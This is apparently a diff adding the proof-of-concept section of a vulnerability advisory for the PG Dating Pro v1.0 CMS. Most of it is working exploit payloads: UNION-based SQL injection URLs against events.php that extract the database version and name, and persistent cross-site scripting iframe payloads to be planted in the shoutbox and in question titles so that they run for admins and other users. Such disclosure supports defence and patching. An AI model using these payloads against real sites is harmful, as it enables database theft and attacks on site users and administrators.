@@ -1,0 +1,29 @@
+Proof of Concept:
+=================
+1.1
+The SQL injection vulnerability can be exploited by remote attackers without user inter action. For demonstration or reproduce ...
+
+PoC: 
+<html><head><body>
+<title>Proof of Concept: PG Dating Pro v1.0 CMS - Remote SQL Injection Vulnerability</title>
+1<iframe src=http://datingpro.127.0.0.1:5723/dating/events.php?sel=edit_event&id_event=5
++union+Select+1,2,3,4,5,6,7,8,9,10,11,version%28%29,13,14,15,16,17,18--%20- width="1000" height="800">
+<br>
+2<iframe src=http://datingpro.127.0.0.1:5723/dating/events.php?sel=edit_event&id_event=5
++union+Select+1,2,3,4,5,6,7,8,9,10,11,()database%28%29,13,14,15,16,17,18--%20- width="1000" height="800">
+</body></head><html>
+
+
+1.2
+The persistent input validation vulnerabilities can be exploited by remote attackers with low or medium required user inter action 
+& low privileged user account. For demonstration or reproduce ...
+
+1.2.1
+The attacker can post a message in the shoutbox with injecting a malicious code i.e., 
+>"<iframe src=http://www.vulnerability-lab.com onload=alert("VL")</iframe>
+When the admin or any user view anypage where the shoutbox is displayed the code gets executed.
+
+1.2.2
+If an attacker has admin rights he can inject all users by posting a question and editing it is title to have a malicious code, 
+such as >"<iframe src=http://www.vulnerability-lab.com onload=alert("VL")</iframe>
+
